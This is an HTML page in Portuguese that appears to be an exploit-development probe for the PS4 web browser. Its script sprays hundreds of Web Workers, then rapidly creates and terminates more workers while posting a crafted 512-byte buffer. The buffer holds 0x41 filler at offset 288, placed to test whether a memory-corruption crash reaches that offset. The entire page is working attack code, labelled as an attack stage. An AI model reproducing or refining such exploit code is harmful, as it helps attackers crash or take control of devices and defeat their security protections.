<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 CHECK OFFSET 288</title>
    <style>
        body { background-color: #202; color: #f0f; font-family: monospace; text-align: center; padding: 20px; display: flex; flex-direction: column; justify-content: center; height: 90vh; }
        h1 { font-size: 2.5em; margin-bottom: 20px; border-bottom: 2px solid #f0f; display: inline-block; }
        #status { font-size: 2em; border: 2px solid #fff; padding: 20px; background: #000; color: #fff; }
        .attack { background-color: #f00 !important; animation: shake 0.2s infinite; }
        @keyframes shake { 0% {transform: translate(1px, 1px)} 50% {transform: translate(-1px, -1px)} 100% {transform: translate(0,0)} }
    </style>
</head>
<body>

    <h1>TARGET: OFFSET 288 (0x120)</h1>
    <div id="status">ENCHENDO TABELA...</div>

    <script>
        const TARGET_LIMIT = 415; 
        const SPRAY_SIZE = 512;
        
        let workers = [];
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // PREPARA O OBJETO HÍBRIDO
        const payload = new Uint8Array(SPRAY_SIZE);
        payload.fill(0x00); // Fundo Zeros (Seguro)
        
        // Offset 272 (0x110) -> DEIXAMOS COMO 0x00 (Sabemos que é seguro)
        
        // Offset 288 (0x120) -> ENCHEMOS DE LIXO (0x41)
        // Se crashar aqui, sabemos que a execução continua após o 272
        for(let i=0; i<8; i++) {
            payload[288 + i] = 0x41; // 'A'
        }

        function start() {
            let i = setInterval(() => {
                if (workers.length < TARGET_LIMIT) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "ESTABILIZANDO (4s)...";
                    setTimeout(attack, 4000);
                }
            }, 30);
        }

        function attack() {
            const st = document.getElementById('status');
            st.innerText = ">>> ATACANDO OFFSET 288 <<<";
            st.className = "attack";

            setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try {
                    if(workers.length > 0) workers[0].postMessage(payload);
                } catch(e){}
            }, 10);
        }

        setTimeout(start, 1500);

    </script>
</body>
</html>
